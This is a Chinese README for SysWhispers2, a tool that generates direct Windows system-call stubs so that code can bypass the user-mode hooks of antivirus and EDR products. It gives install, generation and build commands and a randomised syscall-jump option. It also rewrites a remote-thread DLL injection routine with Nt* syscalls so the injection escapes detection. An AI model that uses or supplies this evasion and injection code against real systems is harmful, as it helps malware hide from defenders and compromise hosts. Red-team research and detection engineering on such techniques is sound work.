# SysWhispers2

SysWhispers 通过生成可直接用于系统调用的头文件/汇编文件，帮助绕过安全检测。

所有核心系统调用均受支持，示例生成文件位于 `example-output/` 目录。

## SysWhispers 1 与 2 的区别

使用方式与 [SysWhispers1](https://github.com/jthuraisamy/SysWhispers) 几乎相同，但无需指定支持的 Windows 版本。主要改进在底层实现：
- 不再依赖 [@j00ru](https://twitter.com/j00ru) 的 [系统调用表](https://github.com/j00ru/windows-syscalls)
- 采用 [@modexpblog](https://twitter.com/modexpblog) 推广的 ["按系统调用地址排序" 技术](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)
- 显著减小系统调用存根体积
- 每次生成时函数名哈希随机化

其他相关实现：
- [@ElephantSe4l](https://twitter.com/ElephantSe4l) 的 [C++17 版本](https://github.com/crummie5/FreshyCalls)

原始仓库仍保留但可能不再维护。

## 技术原理

安全产品通过用户模式 API 钩子检测可疑行为。`ntdll.dll` 中的系统调用函数仅含少量汇编指令，直接重新实现这些函数可绕过检测。参考 [@Cn33liz 的技术博客](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)。

## 安装

```bash
> git clone https://github.com/jthuraisamy/SysWhispers2.git
> cd SysWhispers2
> py .\syswhispers.py --help
```

## 使用示例

### 基础命令
```powershell
# 导出全部函数（兼容所有Windows版本）
py .\syswhispers.py --preset all -o syscalls_all

# 仅导出常用函数
py .\syswhispers.py --preset common -o syscalls_common

# 自定义导出内存相关函数
py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem
```

### 完整输出示例
```
PS C:\Projects\SysWhispers2> py .\syswhispers.py --preset common --out-file syscalls_common

                  .                         ,--.
,-. . . ,-. . , , |-. o ,-. ,-. ,-. ,-. ,-.    /
`-. | | `-. |/|/  | | | `-. | | |-' |   `-. ,-'
`-' `-| `-' ' '   ' ' ' `-' |-' `-' '   `-' `---
     /|                     |  @Jackson_T
    `-'                     '  @modexpblog, 2021

生成完成！文件输出至：
        syscalls_common.h
        syscalls_common.c
        syscalls_commonStubs.std.x86.asm
        syscalls_commonStubs.rnd.x86.asm
        syscalls_commonStubs.std.x86.nasm
        syscalls_commonStubs.rnd.x86.nasm
        syscalls_commonStubs.std.x86.s
        syscalls_commonStubs.rnd.x86.s
        syscalls_commonInline.std.x86.h
        syscalls_commonInline.rnd.x86.h
        syscalls_commonStubs.std.x64.asm
        syscalls_commonStubs.rnd.x64.asm
        syscalls_commonStubs.std.x64.nasm
        syscalls_commonStubs.rnd.x64.nasm
        syscalls_commonStubs.std.x64.s
        syscalls_commonStubs.rnd.x64.s
        syscalls_commonInline.std.x64.h
        syscalls_commonInline.rnd.x64.h
```

### 远程线程注入完整改造示例
原始代码：
```c
#include <Windows.h>

void InjectDll(const HANDLE hProcess, const char* dllPath)
{
    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    
    WriteProcessMemory(hProcess, lpBaseAddress, dllPath, strlen(dllPath), nullptr);
    CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, nullptr);
}
```

改造后代码：
```c
#include <Windows.h>
#include "syscalls.h"

void InjectDll(const HANDLE hProcess, const char* dllPath)
{
    HANDLE hThread = NULL;
    LPVOID lpAllocationStart = nullptr;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    
    NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, (PULONG)&szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
}
```

## 完整常用函数列表

- NtCreateProcess (对应 CreateProcess)
- NtCreateThreadEx (对应 CreateRemoteThread)
- NtOpenProcess (对应 OpenProcess)
- NtOpenThread (对应 OpenThread)
- NtSuspendProcess
- NtSuspendThread (对应 SuspendThread)
- NtResumeProcess
- NtResumeThread (对应 ResumeThread)
- NtGetContextThread (对应 GetThreadContext)
- NtSetContextThread (对应 SetThreadContext)
- NtClose (对应 CloseHandle)
- NtReadVirtualMemory (对应 ReadProcessMemory)
- NtWriteVirtualMemory (对应 WriteProcessMemory)
- NtAllocateVirtualMemory (对应 VirtualAllocEx)
- NtProtectVirtualMemory (对应 VirtualProtectEx)
- NtFreeVirtualMemory (对应 VirtualFreeEx)
- NtQuerySystemInformation (对应 GetSystemInfo)
- NtQueryDirectoryFile
- NtQueryInformationFile
- NtQueryInformationProcess
- NtQueryInformationThread
- NtCreateSection (对应 CreateFileMapping)
- NtOpenSection
- NtMapViewOfSection
- NtUnmapViewOfSection
- NtAdjustPrivilegesToken (对应 AdjustTokenPrivileges)
- NtDeviceIoControlFile (对应 DeviceIoControl)
- NtQueueApcThread (对应 QueueUserAPC)
- NtWaitForMultipleObjects (对应 WaitForMultipleObjectsEx)

## Visual Studio 集成完整步骤

1. **添加文件**：
    - 将生成的 .h、.c 和 .asm 文件复制到项目目录
    - 在解决方案资源管理器中右键添加现有项

2. **启用 MASM**：
    - 右键项目 → 生成依赖项 → 生成自定义
    - 勾选 "masm(.targets, .props)"

3. **配置 x86 汇编文件**：
    - 右键 .x86.asm 文件 → 属性
    - 配置：所有配置
    - 平台：Win32
    - 常规 → 项类型：Microsoft Macro Assembler
    - 常规 → 从生成中排除：否

4. **配置 x64 汇编文件**：
    - 右键 .x64.asm 文件 → 属性
    - 配置：所有配置
    - 平台：x64
    - 常规 → 项类型：Microsoft Macro Assembler
    - 常规 → 从生成中排除：否

5. **排除交叉平台编译**：
    - x86 文件在 x64 平台设为 "从生成中排除：是"
    - x64 文件在 Win32 平台设为 "从生成中排除：是"

## 完整编译命令

### MinGW + NASM
```bash
# x86 EXE 完整编译流程
i686-w64-mingw32-gcc -c main.c syscalls.c -Wall -shared
nasm -f win32 -o syscallsstubs.std.x86.o syscallsstubs.std.x86.nasm
i686-w64-mingw32-gcc *.o -o temp.exe
i686-w64-mingw32-strip -s temp.exe -o example.exe
rm -rf *.o temp.exe

# x64 DLL 完整编译流程
x86_64-w64-mingw32-gcc -m64 -c dllmain.c syscalls.c -Wall -shared
nasm -f win64 -o syscallsstubs.std.x64.o syscallsstubs.std.x64.nasm
x86_64-w64-mingw32-dllwrap --def dllmain.def *.o -o temp.dll
x86_64-w64-mingw32-strip -s temp.dll -o example.dll
rm -rf *.o temp.dll
```

### GNU Assembler (GAS)
```bash
# x86 EXE
i686-w64-mingw32-gcc -m32 -Wall -c main.c syscalls.c syscallsstubs.std.x86.s -o example.exe

# x64 DLL
x86_64-w64-mingw32-gcc -m64 -Wall -c dllmain.c syscalls.c syscallsstubs.std.x64.s -o example.dll
```

### LLVM/Clang
```bash
clang -D nullptr=NULL main.c syscall.c syscallstubs.std.x64.s -o test.exe
```

## 高级功能完整实现

### 随机系统调用跳转
```c
// 在代码中定义 RANDSYSCALL 宏
#define RANDSYSCALL

// 使用 rnd 版本的头文件
#include "syscalls.rnd.x64.h"
```

编译命令：
```bash
# x86
i686-w64-mingw32-gcc main.c syscalls.c syscallsstubs.rnd.x86.s -DRANDSYSCALL -Wall -o example.exe

# x64
x86_64-w64-mingw32-gcc main.c syscalls.c syscallsstubs.rnd.x64.s -DRANDSYSCALL -Wall -o example.exe
```

### 内联头文件模式
生成命令：
```bash
py .\syswhispers.py --output-type inlinegas -o syscalls_inline
```

使用示例：
```c
#include "syscalls_inline.rnd.x64.h"

// 直接调用内联汇编
NtAllocateVirtualMemory(hProcess, &lpBase, 0, &size, MEM_COMMIT, PAGE_READWRITE);
```

## 完整注意事项

1. **不支持的调用**：
    - 图形子系统调用 (`win32k.sys`)
    - Windows XP 及更早版本的系统调用

2. **兼容性**：
    - 测试环境：Visual Studio 2019 (v142) + Windows 10 SDK
    - 最低支持：Windows 7 SP1

3. **类型冲突**：
   ```c
   // 如果出现类似错误：
   // error C2371: 'NTSTATUS': redefinition; different basic types
   // 在包含头文件前添加：
   #define _NTDEF_
   ```

4. **调试建议**：
    - 启用 MASM 调试符号：项目属性 → 链接器 → 调试 → 生成调试信息：是
    - 使用 WinDbg 分析系统调用错误码

## 完整引用文献

### 核心技术文章
1. [Bypassing User-Mode Hooks - MDSec](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)
2. [Direct Syscalls + sRDI - Outflank](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
3. [FreshyCalls 实现解析 - Crummie5](https://www.crummie5.club/freshycalls/)

### 相关项目
1. [Dumpert - Direct UMP 实现](https://github.com/outflanknl/Dumpert)
2. [HellsGate - 系统调用混淆技术](https://github.com/am0nsec/HellsGate)
3. [InlineWhispers - BOF 集成方案](https://github.com/outflanknl/InlineWhispers)

## 完整许可证声明

```text
Copyright 2021 Jackson Thuraisamy

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```